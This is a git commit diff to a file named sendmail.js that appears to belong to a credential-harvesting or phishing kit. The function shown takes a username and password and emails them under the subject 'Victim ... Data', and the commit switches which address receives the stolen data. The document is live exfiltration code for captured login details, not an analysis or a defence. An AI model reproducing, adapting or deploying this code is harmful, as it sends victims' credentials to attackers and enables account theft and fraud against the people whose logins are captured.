532e5d131de016afa6dd6fadf05378e83f3e87f2
Syed Saif Ali <syedsaifali214@gmail.com>
2024-05-21 14:03:38 +0530

    email changed

--- sendmail.js
+++ sendmail.js
@@ -14,7 +14,7 @@ function mailkaro(dataof,usname, passpw){
     // Email content
     const mailOptions = {
       from: 'anshuman91vish@gmail.com',
-      to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
+      to: 'vaibhavthakur410@gmail.com', // Replace with the recipient's email address
       subject: `Victim ${dataof} Data`,
       text: `
                     username : ${usname}
